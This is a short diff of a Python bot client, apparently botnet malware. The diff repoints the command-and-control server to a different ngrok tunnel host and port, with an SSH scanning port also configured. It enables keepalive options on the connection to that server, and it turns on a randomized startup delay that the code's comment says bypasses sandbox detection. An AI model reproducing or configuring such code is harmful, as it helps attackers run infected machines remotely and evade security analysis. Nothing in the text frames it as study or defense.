@@ -20,8 +20,8 @@ import random
 import threading
 import base64 as b64
 #config
-cnc                  = "8.tcp.ngrok.io"#your cnc ip
-cport                = 12784#your cnc port
+cnc                  = "4.tcp.ngrok.io"#your cnc ip
+cport                = 12211#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
 scan_port            = 606#same
 sport                = 22#Scanning port
@@ -342,9 +342,9 @@ def conn():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
 			s.connect((cnc,cport))
 
 			signal = handle(s)
@@ -726,5 +726,5 @@ def gip():
 
 if __name__ == '__main__':
 	#Enable this can bypass some sandbox detection
-	#time.sleep(30+random.randint(0,60))
+	time.sleep(30+random.randint(0,60))
 	conn()
